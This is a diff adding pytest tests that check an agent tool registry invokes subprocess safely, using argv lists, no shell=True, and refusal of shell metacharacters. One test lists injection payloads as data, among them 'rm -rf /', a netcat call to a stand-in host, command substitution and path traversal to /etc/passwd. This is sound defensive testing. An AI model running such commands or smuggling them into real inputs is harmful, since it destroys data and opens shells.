@@ -74,3 +74,63 @@ async def test_browser_navigate_no_playwright():
         result = await reg.execute("browser_navigate", {"url": "https://example.com"})
     assert result.success
     assert "not installed" in result.output.lower() or "playwright" in result.output.lower()
+
+
+@pytest.mark.asyncio
+async def test_process_list_no_shell():
+    """process_list must invoke subprocess with argv, never shell=True."""
+    reg = _registry()
+    with patch("subprocess.run") as mock_run:
+        mock_run.return_value = MagicMock(stdout="ok", stderr="")
+        await reg.execute("process_list", {})
+    assert mock_run.called
+    args, kwargs = mock_run.call_args
+    assert kwargs.get("shell") is not True, "shell=True must not be used"
+    assert isinstance(args[0], list), "argv must be a list, not a shell string"
+
+
+@pytest.mark.asyncio
+async def test_process_kill_pid_uses_argv():
+    """Numeric PIDs are passed as discrete argv elements."""
+    reg = _registry()
+    with patch("subprocess.run") as mock_run:
+        mock_run.return_value = MagicMock(stdout="ok", stderr="")
+        await reg.execute("process_kill", {"pid_or_name": "1234"})
+    args, kwargs = mock_run.call_args
+    assert kwargs.get("shell") is not True
+    assert isinstance(args[0], list)
+    assert "1234" in args[0]
+
+
+@pytest.mark.asyncio
+async def test_process_kill_rejects_shell_metacharacters():
+    """Injection attempts must be refused before any subprocess invocation."""
+    reg = _registry()
+    payloads = [
+        "nginx; rm -rf /",
+        "x && curl attacker",
+        "$(id)",
+        "`whoami`",
+        "x|nc evil 1234",
+        "x\nrm -rf /",
+        "../../../etc/passwd",
+    ]
+    for payload in payloads:
+        with patch("subprocess.run") as mock_run:
+            result = await reg.execute("process_kill", {"pid_or_name": payload})
+        assert mock_run.call_count == 0, f"subprocess invoked for payload {payload!r}"
+        assert result.success
+        assert "Refused" in result.output, f"missing refusal for {payload!r}"
+
+
+@pytest.mark.asyncio
+async def test_process_kill_accepts_safe_name():
+    """Plain process names pass the whitelist and are forwarded as argv."""
+    reg = _registry()
+    with patch("subprocess.run") as mock_run:
+        mock_run.return_value = MagicMock(stdout="ok", stderr="")
+        await reg.execute("process_kill", {"pid_or_name": "ollama"})
+    args, kwargs = mock_run.call_args
+    assert kwargs.get("shell") is not True
+    assert isinstance(args[0], list)
+    assert "ollama" in args[0]
